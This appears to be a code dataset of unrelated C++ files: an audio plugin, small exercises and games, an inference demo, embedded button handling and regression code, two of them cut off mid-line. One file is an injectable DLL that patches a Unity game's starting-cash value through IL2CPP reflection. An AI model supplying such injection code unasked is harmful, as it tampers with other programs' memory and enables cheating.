    "#include \"PluginProcessor.h\"\r\n#include \"PluginEditor.h\"\r\n\r\nAudioProcessor::AudioProcessor() :\r\n    juce::AudioProcessor(\r\n        BusesProperties()\r\n            .withInput(\"Input\", juce::AudioChannelSet::stereo(), true)\r\n            .withOutput(\"Output\", juce::AudioChannelSet::stereo(), true)\r\n    ),\r\n    apvts(*this, nullptr, \"Parameters\", Parameters::createParameterLayout()),\r\n    params(apvts)\r\n{\r\n    // do nothing\r\n}\r\n\r\nvoid AudioProcessor::prepareToPlay(double newSampleRate, int samplesPerBlock)\r\n{\r\n    oversampler.prepareToPlay(newSampleRate, samplesPerBlock);\r\n    setLatencySamples(oversampler.getLatencyInSamples());\r\n    sampleRateChanged(newSampleRate);\r\n    reset();\r\n}\r\n\r\nvoid AudioProcessor::releaseResources()\r\n{\r\n    // do nothing\r\n}\r\n\r\nvoid AudioProcessor::sampleRateChanged(double newSampleRate)\r\n{\r\n    float sampleRate = float(params.oversample ? oversampler.getOversampledRate() : newSampleRate);\r\n\r\n    //DBG(\"using sampleRate: \" << sampleRate);\r\n\r\n    params.prepare(sampleRate);\r\n    filterL.prepare(sampleRate);\r\n    filterR.prepare(sampleRate);\r\n\r\n    // TODO: Should really do bypass on the regular signal, not upsampled.\r\n    bypassCoeff = 1.0f - std::exp(-1.0f / (sampleRate * 0.01f));\r\n\r\n    oversampler.reset();\r\n    params.reset();\r\n    filterL.reset();\r\n    filterR.reset();\r\n\r\n    oversample = params.oversample;\r\n}\r\n\r\nvoid AudioProcessor::reset()\r\n{\r\n    bypassFade = 1.0f;\r\n    bypassTarget = 1.0f;\r\n}\r\n\r\nbool AudioProcessor::isBusesLayoutSupported(const BusesLayout& layouts) const\r\n{\r\n    return layouts.getMainOutputChannelSet() == juce::AudioChannelSet::stereo();\r\n}\r\n\r\nvoid AudioProcessor::processBlock(\r\n    juce::AudioBuffer<float>& buffer, [[maybe_unused]] juce::MidiBuffer& midiMessages)\r\n{\r\n    juce::ScopedNoDenormals noDenormals;\r\n    auto numInputChannels = getTotalNumInputChannels();\r\n    auto numOutputChannels = getTotalNumOutputChannels();\r\n    auto numSamples = buffer.getNumSamples();\r\n\r\n    // Clear any output channels that don't contain input data.\r\n    for (auto i = numInputChannels; i < numOutputChannels; ++i) {\r\n        buffer.clear(i, 0, numSamples);\r\n    }\r\n\r\n    params.update();\r\n\r\n    if (params.oversample != oversample) {\r\n        sampleRateChanged(getSampleRate());\r\n    }\r\n\r\n    juce::dsp::AudioBlock<float> renderBlock(buffer);\r\n    if (params.oversample) {\r\n        renderBlock = oversampler.processSamplesUp(buffer);\r\n    }\r\n\r\n    bypassTarget = params.bypassed ? 0.0f : 1.0f;\r\n\r\n    float* channelL = renderBlock.getChannelPointer(0);\r\n    float* channelR = renderBlock.getChannelPointer(1);\r\n\r\n    for (size_t sample = 0; sample < renderBlock.getNumSamples(); ++sample) {\r\n        params.smoothen();\r\n\r\n        filterL.setKrunch(params.krunch);\r\n        filterR.setKrunch(params.krunch);\r\n\r\n        float dryL = channelL[sample];\r\n        float dryR = channelR[sample];\r\n\r\n        float wetL = filterL(dryL);\r\n        float wetR = filterR(dryR);\r\n\r\n        float mixL = params.mix * wetL + (1.0f - params.mix) * dryL;\r\n        float mixR = params.mix * wetR + (1.0f - params.mix) * dryR;\r\n\r\n        float outL = mixL * params.outputLevel;\r\n        float outR = mixR * params.outputLevel;\r\n\r\n        // Crossfade for bypass\r\n        bypassFade += bypassCoeff * (bypassTarget - bypassFade);\r\n        outL = bypassFade * outL + (1.0f - bypassFade) * dryL;\r\n        outR = bypassFade * outR + (1.0f - bypassFade) * dryR;\r\n\r\n        channelL[sample] = outL;\r\n        channelR[sample] = outR;\r\n    }\r\n\r\n    if (params.oversample) {\r\n        oversampler.processSamplesDown(buffer);\r\n    }\r\n}\r\n\r\nvoid AudioProcessor::getStateInformation(juce::MemoryBlock& destData)\r\n{\r\n    copyXmlToBinary(*apvts.copyState().createXml(), destData);\r\n}\r\n\r\nvoid AudioProcessor::setStateInformation(const void* data, int sizeInBytes)\r\n{\r\n    std::unique_ptr<juce::XmlElement> xml(getXmlFromBinary(data, sizeInBytes));\r\n    if (xml.get() != nullptr && xml->hasTagName(apvts.state.getType())) {\r\n        apvts.replaceState(juce::ValueTree::fromXml(*xml));\r\n    }\r\n}\r\n\r\njuce::AudioProcessorEditor* AudioProcessor::createEditor()\r\n{\r\n    return new AudioProcessorEditor(*this);\r\n}\r\n\r\njuce::AudioProcessorParameter* AudioProcessor::getBypassParameter() const\r\n{\r\n    return params.bypassParam;\r\n}\r\n\r\njuce::AudioProcessor* JUCE_CALLTYPE createPluginFilter()\r\n{\r\n    return new AudioProcessor();\r\n}\r\n",
    "#include <iostream>\n\nclass Calculator {\npublic:\n  double num1, num2;\n\n  double add() { return (num1 + num2); }\n  double multiply() { return (num1 * num2); }\n  double substract_1_2() { return (num1 - num2); }\n  double substract_2_1() { return (num2 - num1); }\n  double divide_1_2() { return (num1 / num2); }\n  double divide_2_1() { return (num2 / num1); }\n\n  bool set_num1(double num1) {\n    if (num1 != 0) {\n      this->num1 = num1;\n      return true;\n    }\n    return false;\n  }\n  bool set_num2(double num2) {\n    if (num2 != 0) {\n      this->num2 = num2;\n      return true;\n    }\n    return false;\n  }\n\n  Calculator(double num1, double num2) {\n    this->num1 = num1;\n    this->num2 = num2;\n  }\n};\nint main() {\n  while (true){\n  std::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0434\u0432\u0430 \u0447\u0438\u0441\u043b\u0430: \";\n  double num1, num2;\n  std::cin >> num1;\n  std::cout << \"   \";\n  std::cin >> num2;\n  Calculator calc(num1, num2);\n  if ((num1 || num2) == 0) { std::cout << \"Wrong imput.\" << std::endl;}\n  else {\n  std::cout << \"Add 1 to 2: \" << calc.add() << std::endl;\n  std::cout << \"Multiply 1*2: \" << calc.multiply() << std::endl;\n  std::cout << \"Substract 1 - 2: \" << calc.substract_1_2() << std::endl;\n  std::cout << \"Substract 2 - 1: \" << calc.substract_2_1() << std::endl;\n  std::cout << \"Divide 1 / 2: \" << calc.divide_1_2() << std::endl;\n  std::cout << \"Divide 2 / 1: \" << calc.divide_2_1() << std::endl;\n  }\n  }\n}",
    "#include <iostream>\nusing namespace std;\n\nint main() {\n   int highwayNumber;\n   string direction;\n   string highwayName;\n   cin >> highwayNumber;\n   \n   if(highwayNumber % 2 == 0){\n      direction = \"east/west.\";\n   }else if (highwayNumber % 2 == 1){\n      direction = \"north/south.\";\n   }\n   if(highwayNumber >= 1 && highwayNumber <= 99){\n      cout << \"I-\" << highwayNumber << \" is primary, going \" << direction << endl;\n   }else if(highwayNumber >= 100 && highwayNumber <= 999){\n      if(highwayNumber % 100 == 0){\n         cout << highwayNumber << \" is not a valid interstate highway number.\" << endl;\n      }else{\n         cout << \"I-\" << highwayNumber << \" is auxiliary, serving \" << \"I-\" << highwayNumber % 100 << \", going \" << direction << endl;\n      }\n   }else if(highwayNumber == 0){\n      cout << highwayNumber << \" is not a valid interstate highway number.\" << endl;\n   }else if(highwayNumber > 999){\n      cout << highwayNumber << \" is not a valid interstate highway number.\" << endl;\n   }\n   return 0;\n}\n",
    "\ufeff#include \"engine.hpp\"\n#include <opencv2/opencv.hpp>\n#include <iostream>\n#include <vector>\n#include <string>\n\n// Basically everything has been stolen from https://github.com/FourierMourier/yolov8-onnx-cpp\n// I've just reformatted and simplified everything for this project\n// You should be able to run Infer in a loop at max speed, which was as issue in the original project\n// Additionally, I removed all but Detection tasks, as this was whats important to me :)\n\nint main()\n{\n    std::wstring modelPath = L\"best.onnx\";\n    const char* logid = \"yolo_inference\";\n    const char* provider = \"CPU\"; // or \"CUDA\"\n\n    YoloInferencer inferencer(modelPath, logid, provider);\n\n    std::string imagePath = \"test.jpg\"; // Replace with your image path\n    cv::Mat image = cv::imread(imagePath);\n\n    if (image.empty()) {\n        std::cerr << \"Error: Unable to load image!\" << std::endl;\n        return -1;\n    }\n\n    std::vector<Detection> detections = inferencer.infer(image, 0.1, 0.5);\n\n    for (const auto& detection : detections) {\n        cv::rectangle(image, detection.box, cv::Scalar(0, 255, 0), 2);\n        std::cout << \"Detection: Class=\" << detection.class_id << \", Confidence=\" << detection.confidence\n            << \", x=\" << detection.box.x << \", y=\" << detection.box.y\n            << \", width=\" << detection.box.width << \", height=\" << detection.box.height << std::endl;\n    }\n\n    cv::imshow(\"output\", image);\n    cv::waitKey(0);\n\n    return 0;\n}",
    "#include <ncurses.h>\n#include \"game.h\"\n\nnamespace {\n    void draw_line() {\n        int cols = getcurx(stdscr);\n        int rows = getcury(stdscr);\n\n        for (int cell = 0; cell < Game::WIDTH; cell++) {\n            addch('+');\n            for (int wall = 0; wall < 3; wall++) {\n                addch('-');\n            }\n        }\n        addch('+');\n\n        move(rows + 1, cols);\n    }\n\n    void draw_empty() {\n        int cols = getcurx(stdscr);\n        int rows = getcury(stdscr);\n\n        for (int cell = 0; cell < Game::WIDTH; cell++) {\n            addch('|');\n            for (int wall = 0; wall < 3; wall++) {\n                addch(' ');\n            }\n        }\n        addch('|');\n\n        move(rows + 1, cols);\n    }\n\n    void draw_numbers(Game::data_t const &data, std::size_t shift) {\n        int cols = getcurx(stdscr);\n        int rows = getcury(stdscr);\n\n        for (int cell = 0; cell < Game::WIDTH; cell++) {\n            addch('|');\n            addch(' ');\n            int k = data[shift + cell];\n\n            if (k > 9) k += 'A' - 10;\n            else if (k > 0) k += '0';\n            else k = ' ';\n\n            addch(k);\n            addch(' ');\n        }\n        addch('|');\n\n        move(rows + 1, cols);\n    }\n\n    void draw(Game const &game) {\n        clear();\n        mvprintw(0, 0, \"Moves: %zu\", game.get_moves());\n        int tty_cols = getmaxx(stdscr);\n        int tty_rows = getmaxy(stdscr);\n\n        int center_row = tty_rows / 2;\n        int center_col = tty_cols / 2;\n\n        int width = Game::WIDTH * 4 + 1;\n        int height = Game::HEIGHT * 4 + 1;\n\n        int start_row = center_row - width / 2;\n        int start_col = center_col - height / 2;\n\n        move(start_row, start_col);\n\n        for (int i = 0; i < Game::HEIGHT; i++) {\n            draw_line();\n            draw_empty();\n            draw_numbers(game.get_data(), i * Game::WIDTH);\n            draw_empty();\n        }\n        draw_line();\n    }\n\n}\n\nint main() {\n    initscr();\n    cbreak();\n    noecho();\n    curs_set(0);\n    keypad(stdscr, TRUE);\n\n    Game game;\n\n    draw(game);\n\n    int key = ' ';\n\n    while (game.is_running() && key) {\n        key = getch();\n        if (key == KEY_UP) game.move_up();\n        else if (key == KEY_LEFT) game.move_left();\n        else if (key == KEY_RIGHT) game.move_right();\n        else if (key == KEY_DOWN) game.move_down();\n\n        draw(game);\n    }\n\n    endwin();\n\n    printf(\"You won! Moves: %zu\", game.get_moves());\n\n    return 0;\n}\n",
    "#include \"debounce.h\"\n#include \"myDelay.h\"\n#include \"util.h\"\nextern uint8_t globalIndex;\nextern Timer myTimer;\n\n\n\nuint8_t contadorMask = 0;\nvoid startButon(_sButton *myButton)\n{   \n    myButton->mask = 0;\n    myButton[globalIndex].mask |= (1<<globalIndex) ;\n    myButton->currentState = BUTTON_UP;\n    myButton->stateInput = NO_EVENT;\n    myButton->flagDetected = NOFLAG;\n    myButton->timePressed = 0;\n    myButton->timeDiff = 0;\n    \n}\n void StartHeratBeat(_sHearBeat *controlDeModos){\n    controlDeModos->mask = 0x2AAAAAAA;\n    controlDeModos->flagHearBeatBotonPres = 0;\n    controlDeModos->flagCambiarHearBeat = 0;\n    controlDeModos->flagBotonPresionado = 0;\n    controlDeModos->flagModoActivo = 1;\n    controlDeModos->flagModoCambiado = 1;\n    controlDeModos->estadoPrograma = 5;\n    controlDeModos->estadoHearBeat = 5;\n }\n\n\n\nvoid buttonTask(_delay_t *timedebounce, _sButton *myButton, uint8_t statePulsadores,_sHearBeat *controlDeModos){\n    \n    if(delayRead(timedebounce)){\n        myButton->stateInput = (_eEventInput)((statePulsadores & myButton->mask)>>globalIndex);\n        switch (myButton->currentState){\n            case BUTTON_UP:\n                myButton->flagDetected = NOFLAG;\n                if(myButton->stateInput==PRESSED)\n                    myButton->currentState=BUTTON_FALLING;\n            break;\n            case BUTTON_FALLING:\n                if(myButton->stateInput==PRESSED){\n                    myButton->currentState=BUTTON_DOWN;\n                    myButton->flagDetected = FALLINGFLAG;\n                    myButton->timePressed = myTimer.read_ms();\n                    //myButton->estadoPrograma++;\n                    controlDeModos->flagBotonPresionado = true;\n                }else{\n                    myButton->currentState=BUTTON_UP;\n                }\n            break;\n            case BUTTON_DOWN:\n                ButtonDown(myButton,controlDeModos);\n                if(myButton->stateInput==NOT_PRESSED)\n                    myButton->currentState=BUTTON_RISING;\n            break;\n            case BUTTON_RISING:\n                if(myButton->stateInput==NOT_PRESSED){\n                        myButton->currentState=BUTTON_UP;\n                        myButton->flagDetected = RISINGFLAG;\n                        myButton->timeDiff = myTimer.read_ms()-myButton->timePressed;\n                        controlDeModos->flagBotonPresionado = false;\n                        ButtonRising(myButton,controlDeModos);\n                        \n                }else{\n                    myButton->currentState=BUTTON_DOWN;\n                }\n            break;\n            default:\n                myButton->currentState=BUTTON_UP;\n            break;\n        }         \n        \n    }\n    \n}\n\nvoid ButtonDown(_sButton *myButton,_sHearBeat *controlDeModos){\n\n    if(((myTimer.read_ms() - myButton->timePressed) > 1000) && controlDeModos->flagBotonPresionado){\n        controlDeModos->flagHearBeatBotonPres = true;\n        controlDeModos->flagCambiarHearBeat = false;\n        ControlHearbeat(controlDeModos);\n    }\n\n    if ((myTimer.read_ms() - myButton->timePressed) > 5000 && controlDeModos->flagBotonPresionado){\n        controlDeModos->flagHearBeatBotonPres = false;\n        controlDeModos->flagCambiarHearBeat = true;\n        controlDeModos->flagModoActivo = false;\n        ControlHearbeat(controlDeModos);\n\n    }\n\n}\n\nvoid ButtonRising(_sButton *myButton,_sHearBeat *controlDeModos){\n    if((myButton->timeDiff > 100) && (myButton->timeDiff <= 1000) && !controlDeModos->flagBotonPresionado ){\n       controlDeModos->flagCambiarHearBeat = true;\n       controlDeModos->flagHearBeatBotonPres = false;\n       ControlHearbeat(controlDeModos);\n       controlDeModos->estadoHearBeat++;\n\n       if(controlDeModos->estadoHearBeat >5){\n            controlDeModos->estadoHearBeat = 1;\n       }\n    \n    }\n\n    if((myButton->timeDiff > 1000) && (myButton->timeDiff <= 5000) && !controlDeModos->flagBotonPresionado ){\n        controlDeModos->flagHearBeatBotonPres = false;\n        controlDeModos->estadoPrograma = controlDeModos->estadoHearBeat;\n        controlDeModos->flagModoCambiado = false;\n        controlDeModos->flagModoActivo = true;\n        ControlHearbeat(controlDeModos);\n    }\n\n}\n\nvoid ControlHearbeat(_sHearBeat *controlDeModos){\n\nif(controlDeModos->flagCambiarHearBeat){\n    controlDeModos->mask = controlDeModos->MASK_SECUENCIA_MODO_OFF[controlDeModos->estadoHearBeat-2];\n    controlDeModos->flagCambiarHearBeat = false;\n    return;\n}\n\nif(controlDeModos->flagHearBeatBotonPres){\n    controlDeModos->mask = controlDeModos->MASK_SECUENCIA_BOTON_PRESIONADO[controlDeModos->estadoHearBeat-2];\n    controlDeModos->flagHearBeatBotonPres = false;\n    return;\n}\nif(controlDeModos->flagModoActivo){\n    controlDeModos->mask = controlDeModos->MASK_SECUENCIA_MODO_ON[controlDeModos->estadoHearBeat-2];\n    return;\n}\nif(!controlDeModos->flagModoActivo){\n    controlDeModos->mask = controlDeModos->MASK_SECUENCIA_MODO_OFF[controlDeModos->estadoHearBeat-2];\n\n    return;\n}\n\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"preco_bitcoin\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\n#include <cmath>\r\n#include <graphics.h>\r\n#include \"resource.h\"//\u5bf9\u8bdd\u6846\u8d44\u6e90\r\nusing namespace std;\r\n\r\n/* \u3010\u81ea\u5b66\u53bb\u3011\u7f51\u7ad9\u6536\u96c6 http://www.zixue7.com */\r\n\r\nenum BLOCK {BORDER=0,EMPTY=1,CC=2,GY=3,ZF=4,ZY=5,MC=6,HZ=7,BING=8}; //\u6728\u5757\r\n\r\nIMAGE border,empty,cc,gy,zf,zy,mc,hz,bing,buffer(500,350),gameinterface,menuitf,aboutitf,cmapitf,winimg; //\u56fe\u7247\r\n\r\nBLOCK map[6][7];//\u5730\u56fe\r\n\r\nstruct BLock//\u70b9\u7ed3\u6784\u4f53\r\n{\r\n    int x;\r\n    int y;\r\n};\r\n\r\nint msmode,mapnum,movenum,lstdir=-3;\r\nchar mapname[11];\r\n\r\nvoid about();//\u5173\u4e8e\u6e38\u620f\r\nvoid win();//\u80dc\u5229\r\nvoid game(int mapnum);//\u6838\u5fc3\u51fd\u6570\uff1a\u6267\u884c\u6e38\u620f\r\nvoid menu();//\u83dc\u5355\r\nvoid choosemap();//\u5730\u56fe\u83dc\u5355\r\nvoid draw();//\u7ed8\u5236\r\n\r\n//\u7a97\u53e3\u56de\u8c03\u51fd\u6570\r\nBOOL WINAPI HelpDlg_Proc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)\r\n{\r\n    switch(uMsg)// \u5904\u7406 WM_XX \u6d88\u606f\r\n    {\r\n\t\tcase WM_INITDIALOG:\r\n\t\t\treturn true;\r\n\r\n\t\tcase WM_COMMAND:\r\n\t\t\tif((HWND)lParam==GetDlgItem(hWnd,IDC_CLOSE))\r\n\t\t\t{\r\n\t\t\t\tEndDialog(hWnd,1);\r\n\t\t\t}\r\n    }\r\n    return false;\r\n}\r\n\r\n//\u5224\u65ad\u70b9\u4e0e\u77e9\u5f62\u4f4d\u7f6e\u7b97\u6cd5\r\nbool inrect(int x,int y,int x1,int y1,int w1,int h1)\r\n{\r\n    if(x>=x1&&x<x1+w1&&y>=y1&&y<y1+h1)\r\n    {\r\n        return true;\r\n    }\r\n    else\r\n    {\r\n        return false;\r\n    }\r\n}\r\n\r\n//\u52a0\u8f7d\u5730\u56fe\r\nvoid loadmap(int number)\r\n{\r\n    FILE *fp;\r\n    char filename[50];\r\n    sprintf(filename,\"\u5173\u5361\\\\\u5173\u5361%d.map\",number);\r\n    fp=fopen(filename,\"r\");\r\n    int i,j;\r\n    for(i=0; i<6; i++)\r\n        for(j=0; j<7; j++)\r\n        {\r\n            map[i][j]=BORDER;\r\n        }\r\n\r\n    for(j=0; j<5; j++)\r\n        for(i=0; i<4; i++)\r\n        {\r\n            switch(fgetc(fp))\r\n            {\r\n\t\t\t\tcase 'E':\tmap[i+1][j+1]=EMPTY;\tbreak;\r\n\t\t\t\tcase 'C':\tmap[i+1][j+1]=CC;\t\tbreak;\r\n\t\t\t\tcase 'G':\tmap[i+1][j+1]=GY;\t\tbreak;\r\n\t\t\t\tcase 'Z':\tmap[i+1][j+1]=ZF;\t\tbreak;\r\n\t\t\t\tcase 'z':\tmap[i+1][j+1]=ZY;\t\tbreak;\r\n\t\t\t\tcase 'M':\tmap[i+1][j+1]=MC;\t\tbreak;\r\n\t\t\t\tcase 'H':\tmap[i+1][j+1]=HZ;\t\tbreak;\r\n\t\t\t\tcase 'B':\tmap[i+1][j+1]=BING;\t\tbreak;\r\n            }\r\n        }\r\n    fscanf(fp,\"%s\",mapname);\r\n}\r\n\r\n//\u52a0\u8f7d\u56fe\u7247\r\nvoid loadres()\r\n{\r\n    loadimage(&empty,\"IMAGE\",\"EMPTY\");\r\n    loadimage(&bing,\"IMAGE\",\"BING\");\r\n    loadimage(&border,\"IMAGE\",\"BORDER\");\r\n    loadimage(&cc,\"IMAGE\",\"CC\");\r\n    loadimage(&gy,\"IMAGE\",\"GY\");\r\n    loadimage(&zf,\"IMAGE\",\"ZF\");\r\n    loadimage(&zy,\"IMAGE\",\"ZY\");\r\n    loadimage(&mc,\"IMAGE\",\"MC\");\r\n    loadimage(&hz,\"IMAGE\",\"HZ\");\r\n    loadimage(&gameinterface,\"IMAGE\",\"GAMEITF\");\r\n    loadimage(&menuitf,\"IMAGE\",\"MENU\");\r\n    loadimage(&cmapitf,\"IMAGE\",\"MAPMENU\");\r\n    loadimage(&aboutitf,\"IMAGE\",\"ABTGAME\");\r\n    loadimage(&winimg,\"IMAGE\",\"WIN\");\r\n}\r\n\r\n//\u5bfb\u627e\u4e94\u864e\u4e0a\u5c06\uff0c\u66f9\u64cd\u7684\u4f4d\u7f6e\r\nBLock FindBlock(BLOCK block)\r\n{\r\n    struct BLock Block= {0,0};\r\n    int x,y;\r\n    for(x=0; x<=6;)\r\n    {\r\n        for(y=0; y<=7;)\r\n        {\r\n            if(map[x][y]==block)\r\n            {\r\n                Block.x=x;\r\n                Block.y=y;\r\n                return Block;\r\n            }\r\n            else\r\n            {\r\n                y+=1;\r\n            }\r\n        }\r\n        x+=1;\r\n    }\r\n    return Block;\r\n}\r\n\r\n//\u6838\u5fc3\u51fd\u6570\uff1a\u79fb\u52a8\u6728\u5757\u51fd\u6570\r\nbool move(BLOCK block,int dx,int dy)\r\n{\r\n    bool win=false,moved=false;\r\n\r\n\t//\u5175\r\n    if(msmode>10)\r\n    {\r\n        if(map[msmode/10+dx][msmode%10+dy]==EMPTY)\r\n        {\r\n            map[msmode/10][msmode%10]=EMPTY;\r\n            map[msmode/10+dx][msmode%10+dy]=BING;\r\n            msmode+=dx*10+dy;\r\n            moved=true;\r\n        }\r\n    }\r\n\r\n    //\u7ad6\u7740\u7684\u5c06\r\n    if(block>GY&&block<BING)\r\n    {\r\n        BLock blk;\r\n        blk=FindBlock(block);\r\n        if(dx!=0)\r\n        {\r\n            if(map[blk.x+dx][blk.y]==EMPTY&&map[blk.x+dx][blk.y+1]==EMPTY)\r\n            {\r\n                map[blk.x][blk.y]=EMPTY;\r\n                map[blk.x][blk.y+1]=EMPTY;\r\n                map[blk.x+dx][blk.y]=block;\r\n                map[blk.x+dx][blk.y+1]=block;\r\n                moved=true;\r\n            }\r\n        }\r\n        if(dy==1)\r\n        {\r\n            if(map[blk.x][blk.y+2]==EMPTY)\r\n            {\r\n                map[blk.x][blk.y]=EMPTY;\r\n                map[blk.x][blk.y+2]=block;\r\n                moved=true;\r\n            }\r\n        }\r\n        if(dy==-1)\r\n        {\r\n            if(map[blk.x][blk.y-1]==EMPTY)\r\n            {\r\n                map[blk.x][blk.y+1]=EMPTY;\r\n                map[blk.x][blk.y-1]=block;\r\n                moved=true;\r\n            }\r\n        }\r\n    }\r\n\r\n    //\u5173\u7fbd\r\n    if(block==GY)\r\n    {\r\n        BLock blk2;\r\n        blk2=FindBlock(block);\r\n        if(dy!=0)\r\n        {\r\n            if(map[blk2.x][blk2.y+dy]==EMPTY&&map[blk2.x+1][blk2.y+dy]==EMPTY)\r\n            {\r\n                map[blk2.x][blk2.y]=EMPTY;\r\n                map[blk2.x+1][blk2.y]=EMPTY;\r\n                map[blk2.x][blk2.y+dy]=GY;\r\n                map[blk2.x+1][blk2.y+dy]=GY;\r\n                moved=true;\r\n            }\r\n        }\r\n        if(dx==1)\r\n        {\r\n            if(map[blk2.x+2][blk2.y]==EMPTY)\r\n            {\r\n                map[blk2.x+2][blk2.y]=GY;\r\n                map[blk2.x][blk2.y]=EMPTY;\r\n                moved=true;\r\n            }\r\n        }\r\n        if(dx==-1)\r\n        {\r\n            if(map[blk2.x-1][blk2.y]==EMPTY)\r\n            {\r\n                map[blk2.x-1]",
    "// dllmain.cpp : Defines the entry point for the DLL application.\r\n#include \"pch.h\"\r\n#include \"UnityResolve.hpp\"\r\nusing I = UnityResolve;\r\nusing IM = UnityResolve::Method;\r\nusing IC = UnityResolve::Class;\r\nusing IT = UnityResolve::Type;\r\nusing IF = UnityResolve::Field;\r\nusing IA = UnityResolve::Assembly;\r\nusing II = UnityResolve::UnityType;\r\n\r\nvoid Main() {\r\n    UnityResolve::Init(GetModuleHandleA(\"GameAssembly.dll\"), UnityResolve::Mode::Il2Cpp); //IL2Cpp Function :D\r\n    UnityResolve::Assembly* pClass = UnityResolve::Get(\"Assembly-CSharp.dll\");\r\n    const auto carClass = pClass->Get(\"CareerConstants\");\r\n    carClass->SetValue<std::uint32_t>(nullptr, \"s_startingCash\", 99999999);\r\n}\r\nBOOL APIENTRY DllMain( HMODULE hModule,\r\n                       DWORD  ul_reason_for_call,\r\n                       LPVOID lpReserved\r\n                     )\r\n{\r\n    switch (ul_reason_for_call)\r\n    {\r\n    case DLL_PROCESS_ATTACH:\r\n        CreateThread(0, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(Main), 0, 0, 0);\r\n    case DLL_THREAD_ATTACH:\r\n    case DLL_THREAD_DETACH:\r\n    case DLL_PROCESS_DETACH:\r\n        break;\r\n    }\r\n    return TRUE;\r\n}\r\n\r\n",
    "#include \"Regression.h\"\n\nMatrix ordinaryLeastSquaresCoefficients(Matrix* xData, Matrix* yData) { // XData must be invertible. Entries in original XData are horizontal (one row is one observation)\n// Internally, one column is one observation, but not until after the transpose\n    if (xData->getNumRows() <= xData->getNumCols()) {\n        throw std::invalid_argument(\"ordinaryLeastSquaresCoefficients: Must have more observations than predictors\"); // To decrease the chance of XX^T being singular\n    }\n\n    if (yData->getNumCols() > 1) {\n        throw std::invalid_argument(\"ordinaryLeastSquaresCoefficients: Invalid y vector!\");\n    }\n\n    Matrix columnOfOnes(xData->getNumRows(), 1);\n    for (int i = 0; i < xData->getNumRows(); i++) {\n        columnOfOnes(i, 0) = 1;\n    }\n    Matrix xDataA = createAugmentedMatrix(&columnOfOnes, xData);\n    Matrix xDataACorrected = transpose(&xDataA);\n    Matrix* xDataAPointer = &xDataACorrected;\n    Matrix xDataTranspose = conjTranspose(xDataAPointer);\n    Matrix xDataXDataTranspose = matMul(xDataAPointer, &xDataTranspose);\n    Matrix xDataXDataTransposeInverse = inverseMatrix(&xDataXDataTranspose);\n\n    Matrix xDataY = matMul(xDataAPointer, yData);\n    Matrix betaMinimizer = matMul(&xDataXDataTransposeInverse, &xDataY);\n    return betaMinimizer;\n}\n\nLinearRegressor::LinearRegressor(Matrix* xData, Matrix* yData) : numVars(xData->getNumRows()), regressionCoefficients(ordinaryLeastSquaresCoefficients(xData, yData)) {\n    Matrix columnOfOnes(xData->getNumRows(), 1);\n    for (int i = 0; i < xData->getNumRows(); i++) {\n        columnOfOnes(i, 0) = 1;\n    }\n    Matrix xDataA = createAugmentedMatrix(&columnOfOnes, xData);\n\n    //std::cout << \"yData:\\n\" << *yData << std::endl;\n    //std::cout << \"xDataA\\n\" << xDataA << std::endl;\n    //std::cout << \"Regression coefficients:\\n\" << regressionCoefficients << std::endl;\n    Matrix yDataHat = matMul(&xDataA, &regressionCoefficients);\n\n    double MSE = 0;\n\n    //std::cout << \"Y hat is:\\n\" << yDataHat << std::endl;\n    for (int i = 0; i < yData->getNumRows(); i++) {\n        MSE += (magnitudeOfNumber((*yData)(i, 0) - yDataHat(i, 0))) * (magnitudeOfNumber((*yData)(i, 0) - yDataHat(i, 0)));\n    }\n\n    MSE = MSE/yData->getNumRows();\n    m_error = MSE;\n    if (MSE < 1e-9) {\n        m_error = 0;\n    }\n}\n\nComplexNum LinearRegressor::predict(Matrix* xData) {\n    Matrix columnOfOnes(xData->getNumRows(), 1);\n    for (int i = 0; i < xData->getNumRows(); i++) {\n        columnOfOnes(i, 0) = 1;\n    }\n\n    Matrix xDataA = createAugmentedMatrix(&columnOfOnes, xData);\n    //std::cout << \"Predict augmented matrix is\\n\" << xDataA << std::endl;\n    Matrix betaMinizerTimesData = matMul(&xDataA, &regressionCoefficients);\n    return betaMinizerTimesData(0, 0);\n}\n\ndouble LinearRegressor::getError() {\n    return this->m_error;\n}\n\nMatrix LinearRegressor::getRegressionCoefficients() {\n    return this->regressionCoefficients;\n}\n\n\n// Logistic regression\n\nComplexNum sigmoid (ComplexNum numberToSigmoid) {\n    if (numberToSigmoid.getImagPart() != 0) {\n        throw std::invalid_argument(\"sigmoid: Sigmoids are only defined for real numbers!\"); // This can change later, but at the moment logistic regression will only be defined for real numbers\n    }\n\n    double sigmoid = 1/(1 + std::exp(numberToSigmoid.getRealPart() * -1));\n\n    return {sigmoid, 0};\n}\n\nvoid yDataProbTransform(Matrix* yDataToTransform) {\n    for (int i = 0; i < yDataToTransform->getNumRows(); i++) {\n        if ((*yDataToTransform)(i, 0) == 0) {\n            (*yDataToTransform)(i, 0) = ComplexNum(0.0001, 0);\n        } else if ((*yDataToTransform)(i, 0) == 1) {\n            (*yDataToTransform)(i, 0) = ComplexNum(0.9999, 0);\n        }\n    }\n}\n\nComplexNum logit(ComplexNum prob) {\n    if (prob.getImagPart() != 0) {\n        throw std::invalid_argument(\"logit: Logits are only defined for real 